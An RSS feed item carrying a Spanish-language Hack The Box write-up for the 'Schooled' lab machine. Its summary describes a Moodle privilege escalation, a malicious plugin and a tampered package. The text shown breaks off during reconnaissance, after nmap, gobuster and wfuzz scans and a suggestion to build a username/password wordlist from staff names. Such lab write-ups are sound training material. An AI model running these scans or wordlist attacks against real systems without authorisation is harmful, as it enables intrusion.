<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>moodle on sckull</title>
    <link>https://sckull.github.io/tags/moodle/</link>
    <description>Recent content in moodle on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Fri, 10 Sep 2021 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/moodle/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>Hack The Box - Schooled</title>
        <link>https://sckull.github.io/posts/schooled/</link>
        <pubDate>Fri, 10 Sep 2021 00:00:00 +0000</pubDate>
        
        <atom:modified>Fri, 10 Sep 2021 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/schooled/</guid>
        <description>Schooled presenta Moodle donde encontramos una vulnerabilidad que permite escalar privilegios desde el rol Teacher a Administrator, además, con la manipulacion de permisos e instalacion de un plugin ejecutar comandos en la maquina.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/schooled/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Schooled presenta Moodle donde encontramos una vulnerabilidad que permite escalar privilegios desde el rol Teacher a Administrator, además, con la manipulacion de permisos e instalacion de un plugin ejecutar comandos en la maquina. Creamos un repositorio utilizando PKG y un paquete de instalacion, este ultimo fue modificado para obtener acceso privilegiado.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/335&#34;&gt;Schooled&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;FreeBSD&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.234&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/114053&#34;&gt;TheCyberGeek&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/114053&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[6.5, 6.8, 6, 4, 3.2],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[8, 8, 8, 2, 2],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos con nmap nos muestra el puerto http (80), ssh (22) y el puerto mysql (33060) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Wed Apr  7 02:04:59 2021 as: nmap -p- --min-rate 10000 -oN allports 10.129.95.59&lt;/span&gt;
Warning: 10.129.95.59 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.129.95.59 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.129.95.59&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.093s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;48317&lt;/span&gt; filtered ports, &lt;span class=&#34;m&#34;&gt;17215&lt;/span&gt; closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Apr  7 02:06:44 2021 -- 1 IP address (1 host up) scanned in 104.58 seconds&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Wed Apr  7 02:07:13 2021 as: nmap -p 22,80,33060 -sV -sC -oN serviceports 10.129.95.59&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.129.95.59 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.129.95.59&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.084s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;FreeBSD 20200214&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp    open  http    Apache httpd 2.4.46 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;FreeBSD&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; PHP/7.4.15&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-methods: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Potentially risky methods: TRACE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.46 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;FreeBSD&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; PHP/7.4.15
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx?
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Invalid message&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;|     HY000
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;|   LDAPBindReq: 
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;|     *Parse error unserializing protobuf message&amp;#34;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HY000
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   oracle-tns: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Invalid message-frame.&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;|_    HY000
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;# Nmap done at Wed Apr  7 02:07:33 2021 -- 1 IP address (1 host up) scanned in 20.34 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina estatica en el puerto 80, logramos ver el dominio &lt;code&gt;schooled.htb&lt;/code&gt; en el footer de la pagina el cual agregamos a &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/schooled/Screenshot_1.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos, pero solo encontramos las direcciones que se muestran en la pagina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# gobuster dir -u http://schooled.htb/ -w directory-list-2.3-medium.txt -x php,html,txt,yaml,bak -q -t 50&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/contact.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/about.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/fonts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/teachers.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos en la pagina &lt;code&gt;/teachers.html&lt;/code&gt; varios nombres y apellidos, lo cual podria servir para crear un diccionario de usuarios y/o contraseñas.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/schooled/Screenshot_3.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tambien encontramos informacion importante, mencionan que proveen educacion online en la plataforma Moodle, pero, no encontramos ninguna direccion a moodle con gobuster.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/schooled/Screenshot_2.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;wfuzz---subdominios&#34;&gt;WFUZZ - Subdominios&lt;/h2&gt;
&lt;p&gt;Utilizamos &lt;code&gt;wfuzz&lt;/code&gt; para verificar si existe algun subdominio, vemos que existe &lt;code&gt;moodle.schooled.htb&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/schooled&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
└─$ wfuzz -w /usr/share/wordlists/dirb/common.txt -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Host: FUZZ.schooled.htb&amp;#34;&lt;/span&gt; --hh &lt;span class=&#34;m&#34;&gt;20750&lt;/span&gt; --hc &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt; -t &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt; 10.129.95.59
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s documentation &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.95.59/
Total requests: &lt;span class=&#34;nv&#34;&gt;4614&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;=====================================================================&lt;/span&gt;
ID           Response   Lines    Word       Chars       &lt;span class=&#34;nv&#34;&gt;Payload&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================================&lt;/span&gt;

